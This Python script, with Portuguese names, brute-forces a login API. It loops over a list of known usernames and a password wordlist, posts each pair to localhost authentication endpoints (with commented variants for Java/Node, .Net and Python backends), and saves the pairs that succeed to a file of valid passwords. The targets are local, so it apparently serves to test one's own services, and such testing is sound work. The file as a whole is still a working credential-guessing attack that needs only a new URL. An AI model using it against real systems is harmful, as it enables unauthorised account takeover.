import requests

with open("usuarios_validos.txt", "r") as users_list:
    lines = users_list.readlines()

    for line in lines:
    
        user_name  = line.strip()

        with open("wordlist/pass.txt", "r") as wordlist:
            passwords = wordlist.readlines()
            
            for password in passwords:
                user_password = password.strip()    
                payload  = {'login': user_name, 'password': user_password}

                # Request API em Java | Node
                r = requests.post('http://localhost:8080/auth/login', json=payload)

                # Request API em .Net
                # r = requests.post('http://localhost:5127/api/authentication/login', json=payload)

                # Request API em Python
                # r = requests.post('http://localhost:5000/user/login', json=payload)

                response = r.status_code
                if (response == 200):
                    with open("senhas_validas.txt", "a") as result:
                        result.write("\nLogin: " + user_name + " | Senha: "+user_password)